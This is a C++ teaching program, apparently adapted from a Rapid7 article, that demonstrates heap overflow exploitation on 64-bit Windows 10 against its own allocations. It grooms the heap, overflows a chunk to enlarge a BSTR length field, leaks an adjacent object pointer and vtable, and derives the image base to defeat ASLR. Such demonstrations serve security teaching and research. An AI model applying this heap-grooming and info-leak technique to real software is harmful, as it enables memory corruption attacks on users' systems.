#include <Windows.h>
#include <stdint.h>
#include <comdef.h>
#include <inttypes.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <iostream>
using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

// Author: Carlos Dominguez
// Based on: https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/
// Compile: g++ .\heap-overflow-64.cpp -o .\heap-overflow-64.exe -loleaut32 -fpermissive [-g]

// some object from an app
class SomeObject {
public:
  void function1() {};
  virtual void virtual_function1() {};
};

int main(int argc, char** argv) {
  int i;
  BSTR bstr;
  BSTR bstrAtHole;
  BOOL result;
  HANDLE hChunk;
  void* allocations[ALLOC_COUNT];
  BSTR bStrings[5];

  if(argc != 2){
    fprintf(stderr, "Use .\\heap-overflow <imageBase - vtable offset>\n");
    return -1;
  }

  SomeObject* object = new SomeObject();
  HANDLE defaultHeap = GetProcessHeap();
  if (defaultHeap == NULL) {
    printf("No process heap. Are you having a bad day?\n");
    return -1;
  }

  printf("Default heap = 0x%p\n", defaultHeap);

  // We seek to accommodate memory in a predictable configuration. To do this, we must make a maximum of 18 allocations
  // This is because the backend is more predictable than the front-end, which is activated after 18 allocations of equal size
  // In addition, we must take care with first and last allocations that may have a different address gap than the rest, which will have jumps of equal size
  printf("The following should be all in the backend allocator\n");
  for (i = 0; i < ALLOC_COUNT; i++) {
    hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
    memset(hChunk, 'A', CHUNK_SIZE);
    allocations[i] = hChunk;
    printf("[%d] Heap chunk in backend : 0x%p\n", i, hChunk);
  }

  // After this, some of the intermediate allocations are freed in order to create a hole, such as:
  // [ Chunk 1 ][ Free chunk ][ Chunk 3 ] 
  printf("Freeing allocation at index 3: 0x%p\n", allocations[3]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  // We try to fill the hole with some kind of object with a size header you could modify (goal of attack to leak adyacent information)
  // Usually, the ideal chunks are actually objects from the application, but a recognizable object in memory is enough for this demonstration
  // Fill with several objects to incresa the chances of sucess
  for (i = 0; i < 5; i++) {
    bstr = SysAllocString(L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    bStrings[i] = bstr;
    printf("[%d] BSTR string : 0x%p\n", i, bstr);
    if((char*) allocations[3] + 8 == (char*) bstr) bstrAtHole = bstr;
    //else printf("No esta en %d\n", i);
  }

  // Now, we need to free up the next chunk after the hole to fill it with any object we want to leak (ideally, it is filled with objects from the app)
  // [ Chunk 1 ][ BSTR ][ Free Chunk ]
  printf("Freeing allocation at index 4 : 0x%p\n", allocations[4]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[4]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  // We fill the new hole with pointers of SomeObject that we want to leak to obtain it vtable address
  // [ Chunk 1 ][ BSTR ][ Array of pointers ]
  uintptr_t objRef = (uintptr_t) object;
  printf("SomeObject address : 0x%p\n", object);
  printf("Allocating SomeObject to vectors\n");
  vector<uintptr_t> array1(40, objRef);
  vector<uintptr_t> array2(40, objRef);
  vector<uintptr_t> array3(40, objRef);
  vector<uintptr_t> array4(40, objRef);
  vector<uintptr_t> array5(40, objRef);
  vector<uintptr_t> array6(40, objRef);
  vector<uintptr_t> array7(40, objRef);
  vector<uintptr_t> array8(40, objRef);
  vector<uintptr_t> array9(40, objRef);
  vector<uintptr_t> array10(40, objRef);

  // We see the initial size of the object placed in the first hole. This is stored in the first 4 bytes of the chunk where the BSTR is stored
  size_t strSize = SysStringByteLen(bstrAtHole);
  printf("Original String size: %d\n", (int) strSize);
  printf("Overflowing allocation 2\n");
  //DebugBreak();

  // First pause to analyze memory before attack
  system("PAUSE");

  // Fill the previous chunk of BSTR chunk and overflow it to change the size of BSTR
  int allocOffset = (long long int) allocations[3] - (long long int) allocations[2] + 4;
  std::string evilString;
  evilString.append(allocOffset, 'B');
  evilString.append("\x40\x01\x00", 3);
  memcpy(allocations[2], evilString.data(), evilString.size());

  // Print new size of BSTR (not modified by a legitimate user, but by the attacker)
  // This BSTR size change allow an attacker to see information after his allocated space, 
  // so attacaker can see data from other users (dta that ideally filled the second hole)
  strSize = SysStringByteLen(bstrAtHole);
  printf("Modified String size: %d\n", (int) strSize);
  // DebugBreak();

  // Access to data out of space of original BSTR (attacker access to data inside the chunk with object of other users)
  std::wstring ws(bstrAtHole, SysStringLen(bstrAtHole));
  std::string s(reinterpret_cast<const char*>(ws.data()), strSize);
  std::string ref = s.substr(248+64, 8);
 
  // Use data leaked to reconstruct the address of SomeObject 
  uintptr_t refAddr;
  memcpy(&refAddr, ref.data(), sizeof(refAddr)); 
  printf("SomeObject leak: %p\n", (void*)refAddr);

  // Use the leaked address of SomeObject to calculate vtable address (see the address of virtual_function1 stored in object of class SomeObject) 
  // and use it address to obtain the image base address (is necessary to obtain offset between image base and vtable with external app)
  // Image base address is an interesant thing to probe if baseAddr and vtable offset is correct (can be check with winDBG or IDA)
  uintptr_t vftable;
  memcpy(&vftable, (void*)refAddr, sizeof(vftable));
  printf("Found vftable address : 0x%p\n", (void*)vftable);
  uintptr_t offset = (uintptr_t)strtoull(argv[1], NULL, 16);
  uintptr_t baseAddr = vftable - offset;
  printf("====================================\n");
  printf("Image base address is : 0x%16" PRIxPTR "\n", baseAddr);
  printf("====================================\n");

  //DebugBreak();

  // Second pause to analyze memory after attack
  system("PAUSE");

  return 0;
}